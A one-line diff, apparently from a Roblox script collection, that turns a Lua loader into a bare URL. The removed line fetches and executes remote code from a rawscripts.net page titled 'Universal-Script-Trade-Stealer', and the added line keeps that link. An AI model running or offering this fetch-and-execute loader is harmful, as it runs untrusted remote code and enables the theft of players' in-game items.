@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Trade-Stealer-34808"))()
+https://rawscripts.net/raw/Universal-Script-Trade-Stealer-34808
